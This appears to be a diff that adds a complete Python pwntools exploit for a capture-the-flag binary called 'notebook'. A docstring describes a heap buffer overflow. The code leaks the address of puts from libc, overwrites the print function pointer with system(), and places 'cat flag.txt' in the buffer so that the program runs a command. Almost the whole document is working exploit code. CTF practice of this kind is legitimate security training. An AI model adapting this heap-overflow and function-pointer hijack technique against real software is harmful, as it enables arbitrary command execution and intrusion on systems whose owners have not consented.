@@ -1,0 +1,145 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from re import I
+from pwn import *
+
+""""
+The program notebook has a possibility for a heap buffer overflow. That means that one simple notebook can 
+overflow in the next notebook because the read function to change a simple notebook accepts 0xa0 bytes although
+it only has space for 0x3c bytes and additional 4 alginment bytes which still isn't 0xa0. "printable notes" also
+has a reference to the function which shall print the buffer. We have to set this pointer to the function system
+instead of puts. Without the buffer overflow, puts would get the buffer address in rdi. We can use this to provide 
+the buffer address for system as parameter. To make good use of it we have to set the buffer to /bin/sh so we can 
+get a shell. Finally, if we tell the program to print that overflowed printable buffer, it actually calls system 
+which starts a shell where we can run cat flag.txt and get the flag
+"""
+
+exe = context.binary = ELF("./notebook", checksec=False)
+context.log_level = "error"
+libc = context.binary = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
+rol_libc = ROP(libc)
+
+
+def start(argv=[], *a, **kw):
+    gdbscript = """
+    tbreak main
+    continue
+    """.format(
+        **locals()
+    )
+
+    if args.GDB:
+        context.log_level = "debug"
+        context.terminal = ["tmux", "split", "-h"]
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, aslr=False, *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+
+# you can also create new functions here
+
+def read_menu(io, print_menu=False):
+    a = io.recvuntil(b"Exit\n")
+    if (print_menu):
+        print(a)
+
+
+def init_heap(io):
+    """"
+    First we create a simple notebook with the vulnerability and
+    then the printable notebook that allows us to overflow into the simple nb
+    """
+    io.sendline(b"1")  # create a simple nb with some input
+    io.sendline(b"a")
+
+    read_menu(io)
+
+    io.sendline(b"2")  # create printable nb with some input and to set
+    # the print function to puts
+    io.sendline(b"b")
+    io.sendline(b"1")
+
+
+def overflow(io, libc_start):
+    sys_add = p64(libc_start + libc.symbols["system"])  # given the version of libc is libc6_2.31-0ubuntu9.2_amd64, optionally the default libc of the system could be loaded and system could be searched same as a gadget. 
+    payload = (b"A" * 0x48 + b"B" * 0x08 + b"C" * 0x40) + sys_add  # override the simple nb and the meta data
+    # of the printable nb. Then override the buffer
+    # of printable nb and the alignment. After that
+    # override the address of puts with the address of
+    # system
+    io.sendline(b"3")
+    _ = io.recvline()
+    io.sendline(b"0")
+    io.recvline()
+    io.send(payload)
+    read_menu(io)
+    # override entire simple notebook and the meta data of printable notebook such that the
+    # buffer of the printing notebook contains the command.
+    payload = (b"A" * 0x50 + b"cat flag.txt\x00")
+    io.sendline(b"3")
+    _ = io.recvline()
+    io.sendline(b"0")
+    _ = io.recvline()
+    io.send(payload)
+
+
+def activateShell(io):
+    # as soon as the buffer contains the command and the print address is set to system,
+    # we can execute the command
+    io.sendline(b"6")
+    _ = io.recvline()
+    io.sendline(b"0")
+    io.recvuntil(b'show:\n')
+    print(str(io.recvline())[2:-3])
+    
+
+
+def main():
+    io = start()
+    
+    # initiate the sequence
+    io.sendline(b'1')
+    sleep(0.1)
+    io.sendline(b'a')
+    sleep(0.1)
+    io.sendline(b'2')
+    sleep(0.1)
+    io.sendline(b'a')
+    sleep(0.1)
+    io.sendline(b'1')
+    sleep(0.1)
+    io.sendline(b'3')
+    sleep(0.1)
+    io.sendline(b'0')
+    sleep(0.1)
+    io.sendline(b'A' * 143)
+    sleep(0.1)
+    io.sendline(b'5')
+    sleep(0.1)
+    io.sendline(b'0')
+    sleep(0.1)
+    # end of preparations
+    
+    # get rid of the junk on buffer
+    io.recvuntil(b'Exit\n')
+    io.recvuntil(b'Exit\n')
+    io.recvuntil(b'Exit\n')
+    io.recvuntil(b'Exit\n')
+    io.recvuntil(b'show:\n')
+    io.recvuntil(b'\n')
+    # this line contains the leak with the address of puts from glibc
+    leak = io.recvuntil(b'\n')
+    # more junk
+    io.recvuntil(b'Exit\n')
+    # prepare for system
+    init_heap(io)
+    read_menu(io)			# junk
+    overflow(io, (int.from_bytes(leak[:-1], "little", signed= False) - libc.symbols["puts"]))	# overflow works if the libc version matches
+    io.readline(timeout=0.8)	
+    activateShell(io)	# use system() to read the flag
+
+
+
+if __name__ == "__main__":
+    main()
+
